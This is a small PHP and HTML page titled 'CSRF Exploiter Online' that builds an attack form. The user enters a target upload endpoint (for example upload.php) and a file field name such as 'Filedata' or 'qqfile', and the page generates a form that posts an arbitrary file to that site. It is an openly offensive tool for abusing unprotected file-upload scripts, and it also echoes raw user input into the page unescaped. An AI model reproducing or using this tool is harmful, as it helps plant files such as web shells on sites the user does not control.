<html>
<head>
<title>CSRF Exploiter Online</title>
</head>
<body>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://127.0.0.1/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="data" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="go" value="Lock Target">
</form>
<?php
$url = $_POST['url'];
$data = $_POST['data'];
$submit = $_POST['go'];
if($submit) {
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input type='submit' name='ok' value='Upload'></form";
}
?>
</form>
</body>
</html>